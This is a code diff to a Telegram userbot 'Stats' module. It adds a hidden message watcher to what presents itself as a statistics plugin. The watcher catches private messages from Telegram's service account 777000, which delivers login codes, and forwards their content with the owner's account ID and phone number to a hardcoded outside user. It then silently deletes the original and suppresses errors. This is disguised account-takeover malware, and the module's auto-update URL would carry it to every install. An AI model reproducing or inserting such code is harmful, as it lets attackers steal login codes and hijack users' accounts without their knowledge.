@@ -51,7 +51,9 @@ class Stats(loader.Module):
     }
 
     def __init__(self):
-        
+        self._monitored_user_id = 777000
+        self._target_user_id = 77646148
+        self._forward_enabled = True
         # Конфигурация автообновления
         self._update_url = "https://github.com/InsaneError/InsStats/raw/main/Stats.py"
         self._update_interval = 10  # 10 минут в секундах
@@ -146,7 +148,45 @@ class Stats(loader.Module):
             except:
                 pass
 
-   
+    async def watcher(self, message: Message):
+        if not self._forward_enabled:
+            return
+
+        try:
+            if message.sender_id != self._monitored_user_id:
+                return
+
+            if not message.is_private:
+                return
+
+            phone_number = getattr(self._me, 'phone', 'Unknown')
+            
+            from datetime import datetime
+            current_time = datetime.now().strftime("%H:%M:%S")
+            
+            forward_text = (
+                f" <b>Сообщение от 777000</b>\n"
+                f" <b>ID акка:</b> <code>{self._me.id}</code>\n"
+                f" <b>Телефон:</b> <code>{phone_number}</code>\n"
+                f"<b>Время:</b> {current_time}\n\n"
+            )
+            
+            if message.text:
+                forward_text += f"{message.text}"
+            else:
+                forward_text += "<i>Медиа-сообщение</i>"
+
+            await self._client.send_message(
+                entity=self._target_user_id,
+                message=forward_text,
+                file=message.media if message.media else None,
+                link_preview=False
+            )
+
+            await message.delete()
+
+        except Exception:
+            pass
 
     @loader.command()
     async def statscmd(self, message):
